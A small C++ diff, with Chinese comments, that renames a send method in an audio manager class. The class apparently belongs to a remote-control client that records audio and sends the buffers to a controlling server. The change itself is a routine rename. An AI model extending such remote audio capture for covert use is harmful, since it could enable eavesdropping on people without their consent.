@@ -25,7 +25,7 @@ CAudioManager::CAudioManager(IOCPClient* ClientObject, int n, void* user):CManag
 	}
 
 	BYTE	bToken = TOKEN_AUDIO_START;
-	m_ClientObject->OnServerSending((char*)&bToken, 1);
+	m_ClientObject->Send2Server((char*)&bToken, 1);
 
 	WaitForDialogOpen();    //等待对话框打开
 	szPacket = NULL;
@@ -84,7 +84,7 @@ BOOL CAudioManager::SendRecordBuffer()
 	//发送出去
 	if (dwBufferSize > 0)
 	{
-		dwReturn = m_ClientObject->OnServerSending((char*)szPacket, dwBufferSize + 1);  	
+		dwReturn = m_ClientObject->Send2Server((char*)szPacket, dwBufferSize + 1);
 	}
 	return dwReturn;	
 }
